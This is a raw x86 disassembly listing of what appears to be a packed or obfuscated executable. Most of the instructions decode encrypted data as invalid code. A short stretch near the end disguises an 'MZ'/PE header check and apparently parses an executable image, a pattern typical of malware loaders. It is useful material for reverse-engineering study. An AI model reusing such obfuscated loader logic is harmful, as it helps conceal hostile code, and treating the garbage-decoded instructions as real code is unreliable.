  40c509:	setae  BYTE PTR [ebp+ecx*4-0x489f1e3]
  40c511:	jge    0x40c58e
  40c513:	mov    dh,0x19
  40c515:	pop    ebx
  40c516:	test   DWORD PTR [edi-0x318a7690],eax
  40c51c:	fisub  DWORD PTR [ebp+0xc131406]
  40c522:	mov    ch,0x2c
  40c524:	shl    BYTE PTR [ebp+esi*2+0x772dba61],1
  40c52b:	sahf   
  40c52c:	jle    0x40c53e
  40c52e:	test   BYTE PTR [edi+0x2e],dh
  40c531:	inc    esp
  40c532:	imul   esi,DWORD PTR [eax+esi*2+0x73],0xffffff8d
  40c537:	push   ecx
  40c538:	fisttp WORD PTR [eax+0x5320a799]
  40c53e:	push   ebp
  40c53f:	aas    
  40c540:	xor    al,0xea
  40c542:	jecxz  0x40c59a
  40c544:	fdivrp st(6),st
  40c546:	cmp    esp,DWORD PTR [ecx+0x63]
  40c549:	rol    BYTE PTR [esi],cl
  40c54b:	dec    eax
  40c54c:	jl     0x40c4f5
  40c54e:	push   edi
  40c54f:	or     eax,0x8461bc79
  40c554:	(bad)  
  40c555:	mov    es,WORD PTR [ecx+0x3a]
  40c558:	jb     0x40c575
  40c55a:	jg     0x40c503
  40c55c:	jae    0x40c51e
  40c55e:	xchg   edi,eax
  40c55f:	cmp    BYTE PTR [edi+0xa2b312b],ch
  40c565:	dec    edi
  40c566:	(bad)
  40c569:	inc    ebp
  40c56a:	dec    ecx
  40c56b:	out    dx,al
  40c56c:	inc    ebp
  40c56d:	out    dx,al
  40c56e:	call   DWORD PTR [ecx-0x30]
  40c571:	std    
  40c572:	xchg   esi,eax
  40c573:	pushf  
  40c574:	sbb    dh,0xed
  40c577:	(bad)  
  40c578:	push   ecx
  40c579:	in     eax,dx
  40c57a:	push   0xebfad392
  40c57f:	push   0x5b
  40c581:	inc    ecx
  40c582:	cld    
  40c583:	and    BYTE PTR [esi-0x1613b672],al
  40c589:	test   esp,0xb0bd0d08
  40c58f:	sub    DWORD PTR [ecx],0xa61f5c58
  40c595:	stos   BYTE PTR es:[edi],al
  40c596:	clc    
  40c597:	sub    al,0x1
  40c599:	mov    eax,0xd14c7030
  40c59e:	pop    ss
  40c59f:	inc    eax
  40c5a0:	popf   
  40c5a1:	add    DWORD PTR [ecx+0x3b3cbeeb],esp
  40c5a7:	cdq    
  40c5a8:	test   BYTE PTR [ecx+0x7392c5fa],ah
  40c5ae:	daa    
  40c5af:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40c5b1:	outs   dx,DWORD PTR ds:[esi]
  40c5b2:	mov    edx,0xe1453417
  40c5b7:	sti    
  40c5b8:	push   esp
  40c5b9:	mov    dh,0xd7
  40c5bb:	stc    
  40c5bc:	sbb    BYTE PTR [esi],dl
  40c5be:	xor    DWORD PTR [eax-0x751df68d],ecx
  40c5c4:	dec    esp
  40c5c5:	mov    ?,WORD PTR [edx]
  40c5c7:	and    cl,BYTE PTR [edi-0x21b92a01]
  40c5cd:	ret    
  40c5ce:	xchg   BYTE PTR [ecx+0x5183779f],dh
  40c5d4:	rol    al,cl
  40c5d6:	in     al,0x90
  40c5d8:	shr    esp,1
  40c5da:	(bad)  
  40c5db:	xor    al,0xcb
  40c5dd:	cmp    al,BYTE PTR [ebp-0x20e07fe3]
  40c5e3:	fmulp  st(1),st
  40c5e5:	stos   BYTE PTR es:[edi],al
  40c5e6:	sbb    dl,BYTE PTR [edx+0x12]
  40c5e9:	cs inc edi
  40c5eb:	test   DWORD PTR [edi+0x4fbd0df8],0x4477b08
  40c5f5:	(bad)  
  40c5f6:	push   esp
  40c5f7:	retf   
  40c5f8:	jg     0x40c583
  40c5fa:	or     bl,dl
  40c5fc:	xchg   DWORD PTR [ebp-0x7e7d66cc],esi
  40c602:	lock int 0x23
  40c605:	xchg   edi,eax
  40c606:	je     0x40c603
  40c608:	out    0x47,al
  40c60a:	ss jno 0x40c687
  40c60d:	mov    esp,0x49b60568
  40c612:	push   eax
  40c613:	jbe    0x40c63b
  40c615:	ret    
  40c616:	enter  0x14ae,0x2a
  40c61a:	int    0x49
  40c61c:	(bad)  
  40c61d:	in     eax,dx
  40c61e:	test   BYTE PTR [esi],dl
  40c620:	jg     0x40c5d7
  40c622:	dec    esi
  40c623:	add    al,0x4b
  40c625:	fwait
  40c626:	mov    cl,0x89
  40c628:	mov    dh,0x43
  40c62a:	ret    
  40c62b:	or     ch,dh
  40c62d:	xchg   ebp,eax
  40c62e:	fsubr  QWORD PTR [ebx+ebx*1-0x62f80d11]
  40c635:	push   ds
  40c636:	add    BYTE PTR [esi],bl
  40c638:	xchg   ecx,eax
  40c639:	scas   eax,DWORD PTR es:[edi]
  40c63a:	out    0xd0,eax
  40c63c:	xor    eax,0xfd1f9dec
  40c641:	inc    ebx
  40c642:	inc    edi
  40c643:	jle    0x40c68e
  40c645:	sbb    ah,BYTE PTR [edx]
  40c647:	pop    ds
  40c648:	mov    edi,0xcb545e47
  40c64d:	stos   BYTE PTR es:[edi],al
  40c64e:	pop    ebp
  40c64f:	jge    0x40c67e
  40c651:	xor    al,0xf6
  40c653:	ins    DWORD PTR es:[edi],dx
  40c654:	cmc    
  40c655:	enter  0x11d,0x0
  40c659:	imul   edi,DWORD PTR [esp+eax*4+0x3e],0xecc0ce39
  40c661:	shl    BYTE PTR [eax+esi*4],cl
  40c664:	adc    BYTE PTR [ecx+ebx*8-0xb],cl
  40c668:	js     0x40c67d
  40c66a:	add    al,0xf3
  40c66c:	mov    dh,0xf7
  40c66e:	jge    0x40c6b2
  40c670:	inc    edx
  40c671:	das    
  40c672:	call   0xb822:0x3486d1c1
  40c679:	jns    0x40c6ee
  40c67b:	rol    BYTE PTR [esi+0x26a24d00],1
  40c681:	or     eax,0x7fdfd3e2
  40c686:	dec    edx
  40c687:	mov    dh,bh
  40c689:	adc    eax,0xe73fb82f
  40c68e:	dec    eax
  40c68f:	test   BYTE PTR [ebx],bl
  40c691:	cmc    
  40c692:	shl    DWORD PTR [edx],cl
  40c694:	and    DWORD PTR [eax],0xffffffd0
  40c697:	or     eax,0x8915db23
  40c69c:	into   
  40c69d:	push   ecx
  40c69e:	retf   
  40c69f:	cmp    eax,0x38d71ad5
  40c6a4:	or     ebx,0xffffffd5
  40c6a7:	xor    eax,0x5362d08e
  40c6ac:	mov    al,ds:0x723f0772
  40c6b1:	je     0x40c6f1
  40c6b3:	outs   dx,DWORD PTR ds:[esi]
  40c6b4:	(bad)  
  40c6b5:	ds test al,0x1d
  40c6b8:	cmp    dl,bl
  40c6ba:	std    
  40c6bb:	inc    esi
  40c6bc:	ins    DWORD PTR es:[edi],dx
  40c6bd:	(bad)  
  40c6be:	icebp  
  40c6bf:	push   DWORD PTR [edx-0x1a]
  40c6c2:	and    al,0x11
  40c6c4:	inc    ebx
  40c6c5:	in     eax,dx
  40c6c6:	adc    eax,0x8c2e34ca
  40c6cb:	mov    bh,0x61
  40c6cd:	stc    
  40c6ce:	and    ebx,DWORD PTR [esi]
  40c6d0:	or     eax,0x974fbf83
  40c6d5:	leave  
  40c6d6:	mov    edi,0xac8cdf29
  40c6db:	mov    cl,0xf0
  40c6dd:	rol    DWORD PTR [ebx],1
  40c6df:	push   ebx
  40c6e0:	rol    DWORD PTR [ebp+ecx*8+0x55],0x2e
  40c6e5:	push   ebp
  40c6e6:	or     esi,esi
  40c6e8:	test   al,cl
  40c6ea:	push   esi
  40c6eb:	call   edi
  40c6ed:	or     eax,0xdd7380f6
  40c6f2:	jge    0x40c737
  40c6f4:	imul   esi,edx,0x23
  40c6f7:	cmp    ebp,ebp
  40c6f9:	cmp    edx,DWORD PTR [edx]
  40c6fb:	imul   esi,DWORD PTR [ecx-0x51],0xffffffd4
  40c6ff:	scas   al,BYTE PTR es:[edi]
  40c700:	xchg   edi,eax
  40c701:	out    0x8b,al
  40c703:	es adc eax,0x3b1afb38
  40c709:	cwde   
  40c70a:	outs   dx,DWORD PTR ds:[esi]
  40c70b:	jecxz  0x40c774
  40c70d:	mov    bh,0xc6
  40c70f:	sub    eax,0xb48b4a9e
  40c714:	push   0x3a40985e
  40c719:	fldenv [esi+eiz*1]
  40c71c:	cs inc edx
  40c71e:	mov    edx,0x29b467ba
  40c723:	mov    bh,0xd2
  40c725:	xchg   BYTE PTR [edi-0xa],dl
  40c728:	push   es
  40c729:	push   ss
  40c72a:	add    ch,BYTE PTR [ebx]
  40c72c:	stos   DWORD PTR es:[edi],eax
  40c72d:	jns    0x40c73e
  40c72f:	adc    esi,DWORD PTR [ebp+0x1a19c38d]
  40c735:	(bad)  
  40c736:	pop    ecx
  40c737:	ret    0x6988
  40c73a:	sbb    BYTE PTR ds:0xfafaf982,cl
  40c740:	fsub   DWORD PTR [ebp-0x80]
  40c743:	and    bl,BYTE PTR [ebp+0x746e4010]
  40c749:	sub    bl,BYTE PTR [edx+0x4b8626d6]
  40c74f:	sub    eax,0xce67e8ba
  40c754:	dec    eax
  40c755:	(bad)  
  40c756:	mov    BYTE PTR [ebp+edi*8-0xd],bl
  40c75a:	push   es
  40c75b:	mov    WORD PTR [edx+0x61a1d0c3],?
  40c761:	push   cs
  40c762:	sbb    eax,0xcdb2713e
  40c767:	mov    ah,0xdd
  40c769:	mov    edi,0x59d0bd41
  40c76e:	push   cs
  40c76f:	icebp  
  40c770:	sub    cl,BYTE PTR [edi+0x669ea234]
  40c776:	out    0x2c,eax
  40c778:	enter  0x7abc,0xe1
  40c77c:	and    BYTE PTR [ecx+0x39bec275],bh
  40c782:	xchg   edi,eax
  40c783:	retf   0xc863
  40c786:	mov    BYTE PTR [eax-0x57f95a86],bl
  40c78c:	mov    cl,BYTE PTR [ebp-0x4e222220]
  40c792:	aad    0x59
  40c794:	shl    BYTE PTR [ecx-0x34],1
  40c797:	pusha  
  40c798:	dec    ebp
  40c799:	sbb    edi,DWORD PTR [edx-0x16]
  40c79c:	or     DWORD PTR [esi-0x1f],ebx
  40c79f:	pop    ebp
  40c7a0:	push   ds
  40c7a1:	ins    DWORD PTR es:[edi],dx
  40c7a2:	in     al,0x17
  40c7a4:	ins    DWORD PTR es:[edi],dx
  40c7a5:	xor    esp,DWORD PTR [edi]
  40c7a7:	xchg   edi,eax
  40c7a8:	lods   al,BYTE PTR ds:[esi]
  40c7a9:	jo     0x40c772
  40c7ab:	adc    BYTE PTR [edi-0x25],bh
  40c7ae:	shr    dl,0x50
  40c7b1:	rcr    DWORD PTR [edi+0x69],1
  40c7b4:	std    
  40c7b5:	les    esi,FWORD PTR [ecx-0x77]
  40c7b8:	fs xchg esi,eax
  40c7ba:	pop    edx
  40c7bb:	add    al,0xf7
  40c7bd:	iret   
  40c7be:	sub    eax,0x24cf8a9b
  40c7c3:	stos   BYTE PTR es:[edi],al
  40c7c4:	pop    edx
  40c7c5:	push   cs
  40c7c6:	sbb    bh,BYTE PTR [edx+ecx*4+0x50]
  40c7ca:	mov    ecx,0x4b574455
  40c7cf:	in     al,dx
  40c7d0:	cwde   
  40c7d1:	sub    al,0x1b
  40c7d3:	clc    
  40c7d4:	(bad)  
  40c7d5:	jecxz  0x40c762
  40c7d7:	dec    ebp
  40c7d8:	clc    
  40c7d9:	mov    ecx,DWORD PTR [ecx]
  40c7db:	mov    eax,DWORD PTR [eax+ecx*1]
  40c7de:	mov    DWORD PTR [ebp-0x20],eax
  40c7e1:	mov    eax,DWORD PTR [ebp+0x8]
  40c7e4:	xor    eax,esi
  40c7e6:	add    eax,edi
  40c7e8:	mov    DWORD PTR [ebp-0x24],eax
  40c7eb:	mov    eax,DWORD PTR [ebp+0x8]
  40c7ee:	jmp    0x40cb3b
  40c7f3:	mov    ecx,0xbd47bdf8
  40c7f8:	inc    ebx
  40c7f9:	inc    ecx
  40c7fa:	or     BYTE PTR [eax],0xac
  40c7fd:	data16 (bad) 
  40c7ff:	jne    0x40c861
  40c801:	and    ch,ah
  40c803:	leave  
  40c804:	cmp    BYTE PTR [esi+0x7e],0x2e
  40c808:	jge    0x40c888
  40c80a:	jle    0x40c7b5
  40c80c:	scas   al,BYTE PTR es:[edi]
  40c80d:	mov    cl,0x1a
  40c80f:	adc    edx,ecx
  40c811:	adc    DWORD PTR [eiz*8+0x7e6518e0],esi
  40c818:	inc    ebp
  40c819:	(bad)
  40c81c:	add    DWORD PTR [edx-0x62],ecx
  40c81f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c820:	fwait
  40c821:	lahf   
  40c822:	pop    esi
  40c823:	add    BYTE PTR [edx],dh
  40c825:	test   al,0xcf
  40c827:	xlat   BYTE PTR ds:[ebx]
  40c828:	inc    esp
  40c829:	dec    esi
  40c82a:	dec    eax
  40c82c:	cmp    eax,0xea6d12cd
  40c831:	pop    esp
  40c832:	bound  edi,QWORD PTR [edx+0x53]
  40c835:	and    DWORD PTR [ebx],eax
  40c837:	push   esi
  40c838:	retf   0x400e
  40c83b:	cmp    esi,DWORD PTR [edi-0x155a8067]
  40c841:	xchg   BYTE PTR [esi],cl
  40c843:	loopne 0x40c88a
  40c845:	fs inc edi
  40c847:	stos   DWORD PTR es:[edi],eax
  40c848:	outs   dx,BYTE PTR ds:[esi]
  40c849:	outs   dx,BYTE PTR ds:[esi]
  40c84a:	mov    ds:0xc4c7e3d7,al
  40c84f:	xchg   ebp,edx
  40c851:	mov    bh,0xdf
  40c853:	mov    eax,0x4cc9c5ad
  40c858:	jbe    0x40c8d2
  40c85a:	pop    edx
  40c85b:	xchg   esi,eax
  40c85c:	jns    0x40c802
  40c85e:	add    al,0xe2
  40c860:	pop    ss
  40c861:	dec    edx
  40c862:	out    dx,al
  40c863:	add    al,0xce
  40c865:	mov    BYTE PTR [ebx+0x2],bl
  40c868:	add    BYTE PTR [edi+0x22],al
  40c86b:	arpl   WORD PTR [esi+ebx*2],dx
  40c86e:	sbb    al,bh
  40c870:	pop    ds
  40c871:	cmp    BYTE PTR [ebp+0x53],dl
  40c874:	mov    ecx,0xed9a2e31
  40c879:	lods   al,BYTE PTR ds:[esi]
  40c87a:	jb     0x40c810
  40c87c:	jge    0x40c84e
  40c87e:	pop    es
  40c87f:	imul   DWORD PTR [ebx+0x62]
  40c882:	out    0xed,al
  40c884:	mov    bl,BYTE PTR [eax]
  40c886:	and    esi,ebx
  40c888:	in     al,dx
  40c889:	sbb    eax,0xc9e9f6aa
  40c88e:	push   esp
  40c88f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c890:	fisttp DWORD PTR [eax+0x7e]
  40c893:	std    
  40c894:	dec    edi
  40c895:	or     eax,0xa5721d74
  40c89a:	call   0x33d5:0xf9fa6a8c
  40c8a1:	pop    eax
  40c8a2:	jg     0x40c918
  40c8a4:	(bad)  
  40c8a5:	scas   al,BYTE PTR es:[edi]
  40c8a6:	jb     0x40c8ec
  40c8a8:	add    ebp,DWORD PTR [ebp+0x39]
  40c8ab:	je     0x40c8af
  40c8ad:	mov    esp,0x760226b0
  40c8b2:	mov    ebx,0xd8071a30
  40c8b7:	jle    0x40c8bd
  40c8b9:	xchg   edi,eax
  40c8ba:	xor    DWORD PTR [esi],0xffffffd9
  40c8bd:	xchg   edx,eax
  40c8be:	outs   dx,DWORD PTR ds:[esi]
  40c8bf:	jmp    DWORD PTR [esi-0xaad12f1]
  40c8c5:	dec    edi
  40c8c6:	dec    edx
  40c8c7:	fadd   QWORD PTR [ecx]
  40c8c9:	adc    DWORD PTR [ecx],0x7b4d12ec
  40c8cf:	xor    esi,DWORD PTR [ecx]
  40c8d1:	ud0    ecx,DWORD PTR [esi+0x63]
  40c8d5:	out    dx,eax
  40c8d6:	(bad)  
  40c8d7:	jno    0x40c8d0
  40c8d9:	fyl2xp1 
  40c8db:	dec    edx
  40c8dc:	gs push 0x1e13a7c2
  40c8e2:	stc    
  40c8e3:	pop    esi
  40c8e4:	push   esp
  40c8e5:	xchg   ebx,eax
  40c8e6:	sbb    edi,DWORD PTR [eax]
  40c8e8:	js     0x40c893
  40c8ea:	inc    esi
  40c8eb:	add    DWORD PTR [ebx],0x7d0c4c6
  40c8f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8f2:	test   DWORD PTR [esi+0x72],ebx
  40c8f5:	call   0xad6c1f5f
  40c8fa:	mov    ds:0x5b45d09e,al
  40c8ff:	shr    BYTE PTR [edx],0x2e
  40c902:	test   al,0xf2
  40c904:	sub    ebp,DWORD PTR [edi]
  40c906:	repz fist DWORD PTR es:[esp+eiz*4]
  40c90b:	repnz in al,0x6c
  40c90e:	sub    BYTE PTR [ecx-0x1d],dh
  40c911:	adc    edi,DWORD PTR [esi]
  40c913:	jl     0x40c94f
  40c915:	jecxz  0x40c8a0
  40c917:	fcom   QWORD PTR [ecx+esi*1+0x6b]
  40c91b:	outs   dx,BYTE PTR ds:[esi]
  40c91c:	fld    st(2)
  40c91e:	enter  0xdfbb,0x79
  40c922:	pop    ecx
  40c923:	mov    eax,ds:0x8c55b7d3
  40c928:	dec    edx
  40c929:	mov    bh,0x53
  40c92b:	and    al,0x12
  40c92d:	dec    edi
  40c92e:	sbb    BYTE PTR [eax],dh
  40c930:	rcl    DWORD PTR [ebx+0x42c6c815],cl
  40c936:	cld    
  40c937:	mov    ds:0xb6f6a9bb,al
  40c93c:	out    dx,eax
  40c93d:	and    eax,DWORD PTR [edx-0x11]
  40c940:	fld    DWORD PTR [ebx]
  40c942:	in     eax,dx
  40c943:	cmp    eax,0x1a4a9be3
  40c948:	je     0x40c949
  40c94a:	mov    esp,0x58bbaaab
  40c94f:	ficom  DWORD PTR [ebx-0x474de6b9]
  40c955:	mov    dh,BYTE PTR [esi-0x18]
  40c958:	mov    ch,0x50
  40c95a:	xchg   BYTE PTR [esi+0x5cdde66c],bh
  40c960:	and    eax,0x98ad300
  40c965:	popf   
  40c966:	inc    edx
  40c967:	ins    DWORD PTR es:[edi],dx
  40c968:	test   DWORD PTR [eax],ebx
  40c96a:	ror    ecx,cl
  40c96c:	push   ecx
  40c96d:	jle    0x40c97e
  40c96f:	dec    ebx
  40c970:	daa    
  40c971:	lods   al,BYTE PTR ds:[esi]
  40c972:	inc    ebx
  40c973:	xchg   BYTE PTR [edi-0x410b81c6],bl
  40c979:	mov    dh,0x71
  40c97b:	pcmpeqb mm7,QWORD PTR [edi+0x57b3496f]
  40c982:	push   cs
  40c983:	and    al,0xd2
  40c985:	dec    eax
  40c986:	gs scas al,BYTE PTR es:[edi]
  40c988:	mov    al,0x4e
  40c98a:	xchg   DWORD PTR [edx+0x56360b56],eax
  40c990:	sub    dh,BYTE PTR [eax+0x152a850d]
  40c996:	fs repnz cmp ebx,edi
  40c99a:	es add ebx,esp
  40c99d:	sbb    al,0x10
  40c99f:	outs   dx,BYTE PTR ds:[esi]
  40c9a0:	(bad)  
  40c9a1:	ror    BYTE PTR [esi+0x7d],0xc7
  40c9a5:	inc    edx
  40c9a6:	stos   DWORD PTR es:[edi],eax
  40c9a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9a8:	std    
  40c9a9:	out    dx,al
  40c9aa:	(bad)  
  40c9ac:	mov    al,cl
  40c9ae:	pop    ebx
  40c9af:	lock nop
  40c9b1:	jmp    0x6b2d:0xaeaca62f
  40c9b8:	dec    eax
  40c9b9:	(bad)  
  40c9ba:	mov    dl,0xb0
  40c9bc:	(bad)  
  40c9bd:	cmp    BYTE PTR [eax],ah
  40c9bf:	xor    eax,0xdebed9ab
  40c9c4:	ins    BYTE PTR es:[edi],dx
  40c9c5:	(bad)  
  40c9c6:	jno    0x40c9bc
  40c9c8:	sub    al,0x77
  40c9ca:	or     BYTE PTR fs:[eax+0x4b6e158e],bh
  40c9d1:	xchg   edx,eax
  40c9d2:	cmp    BYTE PTR [esi-0x4f],ch
  40c9d5:	hlt    
  40c9d6:	jb     0x40ca30
  40c9d8:	aam    0xcd
  40c9da:	stos   DWORD PTR es:[edi],eax
  40c9db:	(bad)  
  40c9dc:	xchg   esi,eax
  40c9dd:	push   esi
  40c9de:	xchg   BYTE PTR [ebp-0x72aac6f8],dl
  40c9e4:	push   esi
  40c9e5:	retf   0xac47
  40c9e8:	out    dx,al
  40c9e9:	sub    dh,cl
  40c9eb:	loop   0x40c9a0
  40c9ed:	in     eax,0xe9
  40c9ef:	xor    ebx,ecx
  40c9f1:	push   es
  40c9f2:	push   edx
  40c9f3:	mov    ecx,0xf86be477
  40c9f8:	push   edx
  40c9f9:	pushf  
  40c9fa:	fs mov esp,0xf827ccf7
  40ca00:	mov    ah,0xca
  40ca02:	push   esp
  40ca03:	sub    eax,0x94af9214
  40ca08:	call   0x963681cf
  40ca0d:	imul   BYTE PTR [eax-0x2b]
  40ca10:	ficom  WORD PTR [ebp-0x76]
  40ca13:	bound  esi,QWORD PTR [ebp-0x1a]
  40ca16:	lods   al,BYTE PTR ds:[esi]
  40ca17:	and    esp,DWORD PTR [ebp-0x411171a2]
  40ca1d:	mov    esp,0x8bf335ff
  40ca22:	addr16 dec ebx
  40ca24:	pop    esp
  40ca25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca26:	scas   al,BYTE PTR es:[edi]
  40ca27:	aas    
  40ca28:	ins    DWORD PTR es:[edi],dx
  40ca29:	test   eax,0x63956ccf
  40ca2e:	loopne 0x40ca33
  40ca30:	ret    
  40ca31:	jle    0x40ca54
  40ca33:	cs push 0x1
  40ca36:	(bad)  [ebx+0x1908b13b]
  40ca3c:	(bad)  
  40ca3d:	addr16 icebp 
  40ca3f:	lea    esp,[ecx+0x5636cc9d]
  40ca45:	(bad)  
  40ca46:	call   0xa26a:0x60ae7dca
  40ca4d:	js     0x40caa9
  40ca4f:	lahf   
  40ca50:	sub    esp,esp
  40ca52:	xchg   esi,eax
  40ca53:	push   0x26f0aed9
  40ca58:	jbe    0x40caa2
  40ca5a:	mov    ds:0xc59d8a9a,al
  40ca5f:	loopne 0x40ca8d
  40ca61:	loopne 0x40ca20
  40ca63:	int3   
  40ca64:	push   edx
  40ca65:	fs jmp 0x40ca73
  40ca68:	out    0xe0,al
  40ca6a:	mov    ecx,0xe8fc532f
  40ca6f:	jmp    0x40ca5d
  40ca71:	jl     0x40ca46
  40ca73:	shl    BYTE PTR [eax+ebx*4+0x38],0x81
  40ca78:	add    BYTE PTR [eax+ecx*4+0x73847ae3],cl
  40ca7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca80:	push   ebp
  40ca81:	(bad)
  40ca84:	xchg   esp,eax
  40ca85:	scas   eax,DWORD PTR es:[edi]
  40ca86:	adc    BYTE PTR [esi-0x3a4a9cc0],dh
  40ca8c:	adc    eax,0x4efeb71b
  40ca91:	(bad)  
  40ca93:	inc    edx
  40ca94:	mov    cl,BYTE PTR [ebx+ecx*8-0x7]
  40ca98:	imul   ebp,DWORD PTR ds:[ebx],0xbcb7f16c
  40ca9f:	lahf   
  40caa0:	mov    DWORD PTR [ebp+0x7c12bc6d],esi
  40caa6:	sbb    cl,dl
  40caa8:	dec    edi
  40caa9:	imul   eax,DWORD PTR fs:[edi],0xa91a98ae
  40cab0:	call   0x2be70be0
  40cab5:	cmp    esp,esi
  40cab7:	lods   al,BYTE PTR ds:[esi]
  40cab8:	pop    ecx
  40cab9:	sbb    eax,0x39098f82
  40cabe:	mov    bl,0xcb
  40cac0:	pop    eax
  40cac1:	ds nop
  40cac3:	mov    esi,0xba0ac703
  40cac8:	and    al,0x77
  40caca:	xor    ecx,eax
  40cacc:	xchg   DWORD PTR [ebp+0x35],edx
  40cacf:	xchg   ecx,eax
  40cad0:	loopne 0x40cb12
  40cad2:	repz jle 0x40ca79
  40cad5:	dec    edi
  40cad6:	jb     0x40caea
  40cad8:	js     0x40cb19
  40cada:	xor    BYTE PTR [edi+0x1],al
  40cadd:	in     eax,dx
  40cade:	hlt    
  40cadf:	(bad)  
  40cae0:	pop    ebp
  40cae1:	cmp    DWORD PTR [edx],esi
  40cae3:	retf   
  40cae4:	outs   dx,BYTE PTR ds:[esi]
  40cae5:	mov    ecx,0xad132fc4
  40caea:	adc    dh,bl
  40caec:	pop    cx
  40caee:	jle    0x40ca9d
  40caf0:	xchg   BYTE PTR [eax+ecx*1-0x5],ch
  40caf4:	xlat   BYTE PTR ds:[ebx]
  40caf5:	fild   QWORD PTR [edx+0x38099fb5]
  40cafb:	sbb    edx,DWORD PTR [ebx]
  40cafd:	leave  
  40cafe:	sbb    ah,BYTE PTR [edx+edx*2+0x12]
  40cb02:	fs xchg ecx,eax
  40cb04:	cmp    ebp,DWORD PTR [ebx+0x32ac7713]
  40cb0a:	not    BYTE PTR [esi]
  40cb0c:	dec    eax
  40cb0d:	fs enter 0x2caa,0x7c
  40cb12:	pop    eax
  40cb13:	div    DWORD PTR [esp+ecx*4-0x4a]
  40cb17:	dec    edx
  40cb18:	jmp    0x2587915c
  40cb1d:	sub    ecx,DWORD PTR [esp+eiz*2+0x3c]
  40cb21:	mov    ds:0xcfed5b47,eax
  40cb26:	ret    
  40cb27:	std    
  40cb28:	push   0xffffffbb
  40cb2a:	das    
  40cb2b:	imul   esi,DWORD PTR [edx+0xf6ef5e5],0x2cb1dc6f
  40cb35:	xor    BYTE PTR [ecx+0xa5f0e9b],cl
  40cb3b:	mov    ecx,DWORD PTR [ebp-0x20]
  40cb3e:	xor    eax,esi
  40cb40:	add    eax,edi
  40cb42:	cmp    ecx,eax
  40cb44:	je     0x40cba4
  40cb4a:	mov    eax,DWORD PTR [ebp-0x8]
  40cb4d:	mov    ecx,DWORD PTR [ebp-0x20]
  40cb50:	add    ecx,DWORD PTR [eax]
  40cb52:	mov    DWORD PTR [ebp-0x24],ecx
  40cb55:	mov    eax,DWORD PTR [ebp-0x24]
  40cb58:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb5b:	mov    eax,DWORD PTR [eax+0xc]
  40cb5e:	mov    ecx,DWORD PTR [ecx]
  40cb60:	mov    al,BYTE PTR [eax+ecx*1]
  40cb63:	add    al,0x38
  40cb65:	xor    al,0x46
  40cb67:	cmp    al,0xc5
  40cb69:	je     0x40cb80
  40cb6f:	mov    eax,DWORD PTR [ebp+0x8]
  40cb72:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb75:	xor    eax,esi
  40cb77:	add    eax,edi
  40cb79:	mov    DWORD PTR [ecx],eax
  40cb7b:	jmp    0x40cba4
  40cb80:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40cb87:	jmp    0x40cba4
  40cb8c:	mov    eax,DWORD PTR [ebp-0x8]
  40cb8f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40cb92:	mov    ecx,DWORD PTR [ecx]
  40cb94:	mov    DWORD PTR [eax],ecx
  40cb96:	mov    eax,DWORD PTR [ebp+0xc]
  40cb99:	mov    eax,DWORD PTR [ebp+0x8]
  40cb9c:	push   DWORD PTR [ebp-0x8]
  40cb9f:	call   0x401000
  40cba4:	mov    eax,DWORD PTR [ebp-0xc]
  40cba7:	cmp    eax,ebx
  40cba9:	je     0x40b333
  40cbaf:	mov    eax,DWORD PTR [ebp-0x8]
  40cbb2:	mov    eax,DWORD PTR [eax]
  40cbb4:	pop    edi
  40cbb5:	pop    esi
  40cbb6:	pop    ebx
  40cbb7:	leave  
  40cbb8:	ret    0x8
  40cbbb:	push   ebp
  40cbbc:	mov    ebp,esp
  40cbbe:	push   ecx
  40cbbf:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cbc6:	and    DWORD PTR ds:0x430455,0x0
  40cbd0:	jmp    0x40cbe0
  40cbd5:	mov    eax,ds:0x430455
  40cbda:	inc    eax
  40cbdb:	mov    ds:0x430455,eax
  40cbe0:	cmp    DWORD PTR ds:0x430455,0x1f
  40cbe7:	jae    0x40cc78
  40cbed:	cmp    DWORD PTR ds:0x430455,0x10
  40cbf4:	jne    0x40cc05
  40cbfa:	push   0x2023
  40cbff:	call   DWORD PTR ds:0x42ea0b
  40cc05:	cmp    DWORD PTR ds:0x430455,0xf
  40cc0c:	jne    0x40cc20
  40cc12:	xor    eax,eax
  40cc14:	xor    eax,DWORD PTR ds:0x430455
  40cc1a:	inc    eax
  40cc1b:	mov    ds:0x430455,eax
  40cc20:	jmp    0x40cbd5
  40cc25:	and    DWORD PTR ds:0x43043d,0x0
  40cc2f:	mov    eax,ds:0x43043d
  40cc34:	inc    eax
  40cc35:	mov    ds:0x43043d,eax
  40cc3a:	cmp    DWORD PTR ds:0x43043d,0x29
  40cc41:	jne    0x40cc6b
  40cc47:	push   DWORD PTR [ebp-0x18]
  40cc4a:	push   DWORD PTR [ebp-0x10]
  40cc4d:	push   0x42e917
  40cc52:	push   0x5c7c
  40cc57:	push   0x209d
  40cc5c:	push   DWORD PTR [ebp-0x1c]
  40cc5f:	push   DWORD PTR [ebp-0x18]
  40cc62:	push   DWORD PTR [ebp-0x24]
  40cc65:	call   DWORD PTR ds:0x42eacb
  40cc6b:	cmp    DWORD PTR ds:0x43043d,0x1e
  40cc72:	jb     0x40cc2f
  40cc78:	mov    eax,DWORD PTR [ebp+0x8]
  40cc7b:	mov    al,BYTE PTR [eax]
  40cc7d:	add    al,0x38
  40cc7f:	xor    al,0x46
  40cc81:	cmp    al,0xc3
  40cc83:	jne    0x40ccc8
  40cc89:	mov    eax,DWORD PTR [ebp+0x8]
  40cc8c:	mov    ecx,DWORD PTR [ebp+0x8]
  40cc8f:	add    ecx,DWORD PTR [eax+0x3c]
  40cc92:	mov    edx,0x7510854
  40cc97:	mov    DWORD PTR [ebp+0x8],ecx
  40cc9a:	mov    eax,DWORD PTR [ebp-0x4]
  40cc9d:	xor    eax,edx
  40cc9f:	push   esi
  40cca0:	mov    esi,DWORD PTR [ebp+0x8]
  40cca3:	mov    ecx,0x32729b
  40cca8:	add    eax,ecx
